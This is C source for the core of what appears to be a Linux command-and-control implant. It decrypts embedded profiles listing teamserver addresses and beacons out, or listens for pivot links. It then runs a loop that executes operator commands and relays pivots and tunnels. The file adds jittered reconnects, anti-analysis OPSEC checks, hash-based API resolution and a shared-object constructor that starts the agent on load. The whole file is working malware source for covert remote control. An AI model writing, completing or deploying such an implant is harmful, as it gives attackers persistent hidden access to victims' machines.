#include "types.h"
#include "crt.h"
#include "msgpack.h"
#include "crypt.h"
#include "connector.h"
#include "agent_info.h"
#include "commander.h"
#include "jobs.h"
#include "pivot.h"
#include "proxyfire.h"
#include "elf_resolve.h"
#include "opsec.h"
#include "config.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

/// Global state
static int ACTIVE = 1;

/// Stored argv for process masquerading (set by entry point)
char **g_argv = NULL;

/// Decode an encrypted profile blob
/// Input: [key 16B][AES-128-GCM encrypted msgpack(Profile)]
typedef struct {
    uint32_t  type;
    uint32_t  listener_watermark;
    char**    addresses;
    uint32_t  addr_count;
    int       banner_size;
    int       conn_timeout;
    int       conn_count;
    int       use_ssl;
    uint8_t   enc_key[16];
    uint16_t  bind_port;
} profile_t;

static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
    if (enc_size < 16 + GCM_NONCE_SIZE + GCM_TAG_SIZE) return -1;

    // Extract key (first 16 bytes)
    ax_memcpy(prof->enc_key, enc_data, 16);

    // Decrypt the rest
    size_t pt_len;
    uint8_t* plaintext = aes128_gcm_decrypt(enc_data + 16, enc_size - 16, prof->enc_key, &pt_len);
    if (!plaintext) return -1;

    // Parse msgpack Profile struct
    mp_reader_t r;
    mp_reader_init(&r, plaintext, pt_len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        ax_free(plaintext);
        return -1;
    }

    // Initialize defaults
    prof->type = 0;
    prof->listener_watermark = 0;
    prof->addresses = (char**)0;
    prof->addr_count = 0;
    prof->banner_size = 0;
    prof->conn_timeout = 10;
    prof->conn_count = 1000000000;
    prof->use_ssl = 0;
    prof->bind_port = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->type = (uint32_t)v;
        } else if (klen == 18 && ax_memcmp(key, "listener_watermark", 18) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->listener_watermark = (uint32_t)v;
        } else if (klen == 9 && ax_memcmp(key, "addresses", 9) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) == 0) {
                prof->addresses = (char**)ax_malloc(arr_count * sizeof(char*));
                prof->addr_count = arr_count;
                for (uint32_t j = 0; j < arr_count; j++) {
                    const char* addr; uint32_t alen;
                    mp_read_str(&r, &addr, &alen);
                    prof->addresses[j] = (char*)ax_malloc(alen + 1);
                    ax_memcpy(prof->addresses[j], addr, alen);
                    prof->addresses[j][alen] = '\0';
                }
            }
        } else if (klen == 11 && ax_memcmp(key, "banner_size", 11) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->banner_size = (int)v;
        } else if (klen == 12 && ax_memcmp(key, "conn_timeout", 12) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->conn_timeout = (int)v;
        } else if (klen == 10 && ax_memcmp(key, "conn_count", 10) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->conn_count = (int)v;
        } else if (klen == 7 && ax_memcmp(key, "use_ssl", 7) == 0) {
            bool v; mp_read_bool(&r, &v); prof->use_ssl = v ? 1 : 0;
        } else if (klen == 9 && ax_memcmp(key, "bind_port", 9) == 0) {
            uint64_t v; mp_read_uint(&r, &v); prof->bind_port = (uint16_t)v;
        } else {
            mp_skip(&r);
        }
    }

    ax_free(plaintext);
    return 0;
}

static void free_profile(profile_t* prof) {
    if (prof->addresses) {
        for (uint32_t i = 0; i < prof->addr_count; i++) {
            if (prof->addresses[i])
                ax_free(prof->addresses[i]);
        }
        ax_free(prof->addresses);
    }
}

/// Build the init message: [4B listener_watermark BE][encrypted(StartMsg{type:INIT_PACK, data:InitPack{id, type, data:sessionInfo}})]
/// The 4B watermark prefix enables pivot routing — parent extracts it and sends to teamserver
/// Encrypted portion uses profile key (AES-128-GCM)
static int build_init_msg(uint32_t agent_id, uint32_t profile_type,
                          uint32_t listener_watermark,
                          const uint8_t* session_info, size_t si_len,
                          const uint8_t* enc_key,
                          uint8_t** out_msg, size_t* out_len) {
    // Inner: InitPack — declaration order: Id, Type, Data → tags: id, type, data
    mp_writer_t inner;
    mp_writer_init(&inner, 256);
    mp_write_map(&inner, 3);
    mp_write_kv_uint(&inner, "id", agent_id);
    mp_write_kv_uint(&inner, "type", profile_type);
    mp_write_kv_bin(&inner, "data", session_info, (uint32_t)si_len);

    // Outer: StartMsg — declaration order: Type, Data → tags: id, data
    mp_writer_t outer;
    mp_writer_init(&outer, 256);
    mp_write_map(&outer, 2);
    mp_write_kv_int(&outer, "id", INIT_PACK);
    mp_write_kv_bin(&outer, "data", inner.buf.data, (uint32_t)inner.buf.len);

    mp_writer_free(&inner);

    // Encrypt with profile key
    size_t enc_len;
    uint8_t* encrypted = aes128_gcm_encrypt(outer.buf.data, outer.buf.len, enc_key, &enc_len);
    mp_writer_free(&outer);

    if (!encrypted) return -1;

    // Prepend 4-byte listener watermark (big-endian) for pivot routing
    size_t total_len = 4 + enc_len;
    uint8_t* msg = (uint8_t*)ax_malloc(total_len);
    if (!msg) { ax_free(encrypted); return -1; }

    msg[0] = (uint8_t)(listener_watermark >> 24);
    msg[1] = (uint8_t)(listener_watermark >> 16);
    msg[2] = (uint8_t)(listener_watermark >> 8);
    msg[3] = (uint8_t)(listener_watermark);
    ax_memcpy(msg + 4, encrypted, enc_len);
    ax_free(encrypted);

    *out_msg = msg;
    *out_len = total_len;
    return 0;
}

/// Parse Message{type: int8, object: [][]byte} from decrypted data
static int parse_message(const uint8_t* data, size_t len,
                         int8_t* msg_type,
                         const uint8_t*** objects, uint32_t** obj_sizes,
                         uint32_t* obj_count) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    *msg_type = 0;
    *objects = (const uint8_t**)0;
    *obj_sizes = (uint32_t*)0;
    *obj_count = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;

        if (klen == 6 && ax_memcmp(key, "object", 6) == 0) {
            uint32_t arr_count;
            if (mp_read_array(&r, &arr_count) != 0) return -1;

            *objects = (const uint8_t**)ax_malloc(arr_count * sizeof(uint8_t*));
            *obj_sizes = (uint32_t*)ax_malloc(arr_count * sizeof(uint32_t));
            *obj_count = arr_count;

            for (uint32_t j = 0; j < arr_count; j++) {
                const uint8_t* bin_data;
                uint32_t bin_len;
                if (mp_read_bin(&r, &bin_data, &bin_len) != 0) return -1;
                (*objects)[j] = bin_data;
                (*obj_sizes)[j] = bin_len;
            }
        } else if (klen == 4 && ax_memcmp(key, "type", 4) == 0) {
            int64_t v;
            if (mp_read_int(&r, &v) != 0) return -1;
            *msg_type = (int8_t)v;
        } else {
            mp_skip(&r);
        }
    }
    return 0;
}

/// Parse a single Command from msgpack: {code: uint, id: uint, data: []byte}
static int parse_command(const uint8_t* data, size_t len,
                         uint32_t* code, uint32_t* cmd_id,
                         const uint8_t** cmd_data, uint32_t* cmd_data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    *code = 0; *cmd_id = 0; *cmd_data = (uint8_t*)0; *cmd_data_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key;
        uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;

        if (klen == 4 && ax_memcmp(key, "code", 4) == 0) {
            uint64_t v; mp_read_uint(&r, &v); *code = (uint32_t)v;
        } else if (klen == 2 && ax_memcmp(key, "id", 2) == 0) {
            uint64_t v; mp_read_uint(&r, &v); *cmd_id = (uint32_t)v;
        } else if (klen == 4 && ax_memcmp(key, "data", 4) == 0) {
            mp_read_bin(&r, cmd_data, cmd_data_len);
        } else {
            mp_skip(&r);
        }
    }
    return 0;
}

/// ---- Entry points ----

static int agent_main(void);

#ifdef BUILD_SO
// Linux passes argc, argv, envp to constructors (GCC extension)
__attribute__((constructor))
static void so_entry(int argc, char **argv, char **envp) {
    (void)argc; (void)envp;
    g_argv = argv;
    agent_main();
}
#else
// Static ELF: _start receives the stack directly from the kernel.
// On Linux x86_64/ARM64, stack layout at _start:
//   [rsp/sp] = argc
//   [rsp+8]  = argv[0]
//   [rsp+16] = argv[1]
//   ...
//
// CRITICAL: _start MUST be naked. Without naked, gcc generates a
// function prologue (push rbp; mov rbp,rsp) that shifts RSP before
// we can read it, corrupting g_argv → segfault in masquerade/migrate.

// Helper called from the naked ASM trampoline with the original SP value.
__attribute__((noreturn, noinline, used))
static void _start_c(unsigned long *stack) {
    g_argv = (char **)(stack + 1);  // argv starts after argc
    int ret = agent_main();
    sys_exit_group(ret);
    __builtin_unreachable();
}

__attribute__((naked, noreturn))
void _start(void) {
#ifdef ARCH_X86_64
    __asm__ volatile (
        "mov   %%rsp, %%rdi\n"   // rdi = original SP (argc at [rsp])
        "and   $-16, %%rsp\n"    // 16-byte align stack (ABI)
        "call  _start_c\n"
        ::: "memory"
    );
#elif defined(ARCH_AARCH64)
    __asm__ volatile (
        "mov   x0, sp\n"         // x0 = original SP (argc at [sp])
        "and   sp, x0, #-16\n"   // 16-byte align stack (ABI)
        "bl    _start_c\n"
        ::: "memory"
    );
#endif
}
#endif

/// Command loop — shared between client TCP and bind TCP modes.
/// Handles recv/process/send cycle with non-blocking polling.
/// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error.
static int command_loop(connector_t* conn, const uint8_t* session_key) {
    while (ACTIVE) {
        uint8_t* recv_data = (uint8_t*)0;
        size_t recv_len = 0;

        // Poll C2 socket with 100ms timeout
        int poll_ret = conn_recv_msg_timeout(conn, &recv_data, &recv_len, 100);
        if (poll_ret < 0) return -1;  // error/disconnect → reconnect

        // Build response objects collector
        mp_writer_t obj_collector;
        mp_writer_init(&obj_collector, 1024);
        uint32_t resp_count = 0;

        // If we received data from teamserver, process it
        uint8_t* plaintext = (uint8_t*)0;
        const uint8_t** objects = (const uint8_t**)0;
        uint32_t* obj_sizes = (uint32_t*)0;
        uint32_t obj_count = 0;

        if (poll_ret == 0 && recv_data && recv_len > 0) {
            // Decrypt with session key
            size_t plain_len;
            plaintext = aes128_gcm_decrypt(recv_data, recv_len, session_key, &plain_len);
            ax_free(recv_data);
            recv_data = (uint8_t*)0;
            if (!plaintext) return -1;

            // Parse Message
            int8_t msg_type = 0;

            if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
                ax_free(plaintext);
                return -1;
            }

            if (msg_type == 1 && obj_count > 0) {
                for (uint32_t i = 0; i < obj_count; i++) {
                    uint32_t code = 0, cmd_id = 0;
                    const uint8_t* cmd_data = (const uint8_t*)0;
                    uint32_t cmd_data_len = 0;
                    parse_command(objects[i], obj_sizes[i],
                                 &code, &cmd_id, &cmd_data, &cmd_data_len);

                    mp_writer_t cmd_resp;
                    mp_writer_init(&cmd_resp, 256);

                    int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
                    if (ret == -99) ACTIVE = 0;

                    // Wrap response in Command{code, id, data}
                    mp_writer_t wrapped;
                    mp_writer_init(&wrapped, 256);
                    mp_write_map(&wrapped, 3);
                    mp_write_kv_uint(&wrapped, "code", code);
                    mp_write_kv_uint(&wrapped, "id", cmd_id);
                    mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);

                    mp_write_bin(&obj_collector, wrapped.buf.data, (uint32_t)wrapped.buf.len);
                    mp_writer_free(&cmd_resp);
                    mp_writer_free(&wrapped);
                    resp_count++;
                }
            }
        } else if (poll_ret == 0 && recv_len == 0) {
            // Received empty heartbeat from teamserver (len=0 msg)
            ax_free(recv_data);
            recv_data = (uint8_t*)0;
        }
        // poll_ret == 1: timeout, no data from teamserver

        // ALWAYS poll active pivots and tunnels
        resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
        resp_count += (uint32_t)process_tunnels(&obj_collector);

        // Send response if we have data OR if we received a message from teamserver
        int must_respond = (poll_ret == 0);
        if (resp_count > 0 || must_respond) {
            mp_writer_t msg_writer;
            mp_writer_init(&msg_writer, 1024);
            mp_write_map(&msg_writer, 2);

            if (resp_count > 0) {
                mp_write_kv_int(&msg_writer, "type", 1);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, resp_count);
                buf_append(&msg_writer.buf, obj_collector.buf.data, obj_collector.buf.len);
            } else {
                mp_write_kv_int(&msg_writer, "type", 0);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, 0);
            }

            size_t enc_len;
            uint8_t* encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
                                                     session_key, &enc_len);
            mp_writer_free(&msg_writer);

            if (encrypted) {
                if (conn_send_msg(conn, encrypted, enc_len) != 0) {
                    ax_free(encrypted);
                    mp_writer_free(&obj_collector);
                    if (objects) ax_free((void*)objects);
                    if (obj_sizes) ax_free(obj_sizes);
                    if (plaintext) ax_free(plaintext);
                    return -1;
                }
                ax_free(encrypted);
            }
        }
        mp_writer_free(&obj_collector);

        // Cleanup
        if (objects) ax_free((void*)objects);
        if (obj_sizes) ax_free(obj_sizes);
        if (plaintext) ax_free(plaintext);
        if (recv_data) ax_free(recv_data);
    }
    return 0;
}

static int agent_main(void) {
    // OPSEC checks — abort if hostile environment detected
#ifdef OPSEC_ENABLED
    if (opsec_check() != 0) return 1;
#endif

    // ELF resolver — resolve libc APIs by hash (SO mode only)
#ifdef BUILD_SO
    if (elf_resolver_init() != 0) return 1;
#endif

    // Decode profiles from config
    profile_t profiles[8];
    uint32_t  profile_count = 0;

#if PROFILE_COUNT > 0
    for (int i = 0; i < PROFILE_COUNT && i < 8; i++) {
        if (decode_profile(enc_profiles[i], enc_profile_sizes[i], &profiles[profile_count]) == 0) {
            profile_count++;
        }
    }
#endif

    if (profile_count == 0) return 1;

    // Create session info
    mp_writer_t si_writer;
    mp_writer_init(&si_writer, 512);
    uint8_t session_key[16];
    if (create_session_info(&si_writer, session_key) != 0) return 1;

    // Generate random agent ID
    uint8_t id_buf[4];
    ax_random_bytes(id_buf, 4);
    uint32_t agent_id = ((uint32_t)id_buf[0] << 24) | ((uint32_t)id_buf[1] << 16) |
                        ((uint32_t)id_buf[2] << 8)  | id_buf[3];

    // Keep session info for reuse across profile rotations
    uint8_t* session_info_data = (uint8_t*)ax_malloc(si_writer.buf.len);
    size_t session_info_len = si_writer.buf.len;
    ax_memcpy(session_info_data, si_writer.buf.data, si_writer.buf.len);
    mp_writer_free(&si_writer);

    // Initialize job context for async operations (stubs for Phase 1)
    jobs_init(&g_job_ctx);
    g_job_ctx.agent_id = agent_id;
    ax_memcpy(g_job_ctx.session_key, session_key, 16);

    // Initialize pivot context for TCP relay
    pivots_init(&g_pivot_ctx);

    // Build init message
    uint32_t prof_idx = 0;
    profile_t* prof = &profiles[prof_idx];

    uint8_t* init_msg = (uint8_t*)0;
    size_t init_msg_len = 0;
    build_init_msg(agent_id, prof->type,
                   prof->listener_watermark,
                   session_info_data, session_info_len,
                   prof->enc_key,
                   &init_msg, &init_msg_len);

    if (!init_msg) { ax_free(session_info_data); return 1; }

    if (prof->bind_port > 0) {
        // ======== BIND TCP MODE ========
        // Agent listens on a port, parent connects to us.
        // Used for pivot: beacon parent → "link tcp <ip> <port>" → this agent.
        connector_t server;
        if (conn_bind_listen(&server, prof->bind_port) != 0) {
            ax_free(init_msg);
            ax_free(session_info_data);
            for (uint32_t i = 0; i < profile_count; i++)
                free_profile(&profiles[i]);
            return 1;
        }

        // Accept loop — re-accept if connection drops
        while (ACTIVE) {
            connector_t conn;
            if (conn_accept(&conn, &server) != 0) continue;

            // Send init message (watermark + encrypted beat)
            if (conn_send_msg(&conn, init_msg, init_msg_len) != 0) {
                conn_close(&conn);
                continue;
            }

            // Enter command loop (shared with client TCP mode)
            command_loop(&conn, session_key);

            conn_close(&conn);
        }

        conn_close(&server);
    } else {
        // ======== CLIENT TCP MODE ========
        // Agent connects out to teamserver addresses.
        uint32_t addr_idx = 0;

        for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
            if (attempt > 0) {
                // Bidirectional jitter: ±20% of conn_timeout
                unsigned int base_sleep = (unsigned int)prof->conn_timeout;
                if (base_sleep > 2) {
                    uint8_t rnd[4];
                    ax_random_bytes(rnd, 4);
                    uint32_t rval = ((uint32_t)rnd[0] << 24) | ((uint32_t)rnd[1] << 16) |
                                    ((uint32_t)rnd[2] << 8)  | rnd[3];
                    unsigned int jitter_range = (base_sleep * 40) / 100;
                    unsigned int delta = rval % (jitter_range + 1);
                    unsigned int half = jitter_range / 2;
                    if (base_sleep > half)
                        base_sleep = base_sleep - half + delta;
                }
                sys_sleep(base_sleep);
                addr_idx++;
                if (addr_idx >= prof->addr_count) {
                    addr_idx = 0;
                    prof_idx = (prof_idx + 1) % profile_count;
                    prof = &profiles[prof_idx];

                    ax_free(init_msg);
                    build_init_msg(agent_id, prof->type,
                                   prof->listener_watermark,
                                   session_info_data, session_info_len,
                                   prof->enc_key,
                                   &init_msg, &init_msg_len);
                }
            }

            // Update job context with current connection info
            jobs_update_connection(&g_job_ctx, prof->addresses[addr_idx],
                                  prof->banner_size, prof->enc_key, prof->type);

            // Connect
            connector_t conn;
            if (conn_open(&conn, prof->addresses[addr_idx]) != 0) continue;

            // Reset attempt counter on successful connect
            attempt = 0;

            // Read banner
            if (prof->banner_size > 0) {
                if (conn_discard(&conn, (size_t)prof->banner_size) != 0) {
                    conn_close(&conn);
                    continue;
                }
            }

            // Send init
            if (conn_send_msg(&conn, init_msg, init_msg_len) != 0) {
                conn_close(&conn);
                continue;
            }

            // Enter command loop (shared with bind TCP mode)
            command_loop(&conn, session_key);

            conn_close(&conn);
        }
    }

    // Cleanup
    ax_free(init_msg);
    ax_free(session_info_data);
    for (uint32_t i = 0; i < profile_count; i++)
        free_profile(&profiles[i]);

    return 0;
}
